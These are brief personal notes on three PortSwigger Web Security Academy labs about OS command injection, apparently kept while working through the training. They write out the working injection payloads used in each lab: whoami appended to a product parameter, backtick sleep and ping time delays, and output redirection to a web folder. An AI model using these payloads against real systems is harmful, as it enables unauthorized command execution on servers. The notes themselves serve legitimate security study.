# OS command injection
https://portswigger.net/web-security/os-command-injection

material:
https://www.hackingarticles.in/comprehensive-guide-on-os-command-injection/




<!-- Lab: OS command injection, simple case -->
https://portswigger.net/web-security/os-command-injection/lab-simple

use product stock API request (POST /product/stock HTTP/1.1):
add bash comand 'whoami' to the product parameter with url encoded & (to avoid splitting to a new parameter):
    productId=1%26 whoami &&storeId=1

# OSS!


<!-- Lab: Blind OS command injection with time delays -->
https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

hint:
& ping -c 12 127.0.0.1 &

use feedback form and send messege to repeater (POST /feedback/submit HTTP/1.10)

add a sleep command, inside a backtip to force it to run
&message=blah`+sleep+11+`

# OSS!



<!-- Lab: Blind OS command injection with output redirection -->
https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection


hint:
& whoami > /var/www/static/whoami.txt &

writable folder:
/var/www/images/


payload (urlencoded):
`whoami+>+/var/www/images/whoami2.txt`

whoami ? peter-36IIw6

# OSS!


